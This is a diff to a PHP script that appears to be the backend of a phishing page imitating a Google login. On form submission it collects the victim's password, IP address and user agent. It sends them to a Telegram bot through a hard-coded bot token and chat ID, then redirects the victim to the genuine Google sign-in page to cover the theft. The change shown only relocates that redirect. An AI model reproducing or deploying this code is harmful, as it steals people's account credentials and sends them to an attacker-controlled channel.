@@ -11,14 +11,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $message .= "🔑 Password : " . $password . "\n";
     $message .= "🌍 IP : " . $ip . "\n";
     $message .= "📱 User-Agent : " . $user_agent . "\n";
-    $message .= "⏰ Date : " . $date . "\n";
+    $message .= "⏰ Date : " . $date . "\n\n";
 
     $token = "8552249746:AAFUSy-bxQjRkc3LIYkXomeDdl8m9AJ_gIg";
     $chat_id = "8508877242";
 
     file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
-
-    header("Location: https://accounts.google.com/signin");
-    exit();
 }
+
+header("Location: https://accounts.google.com/signin");
+exit();
 ?>
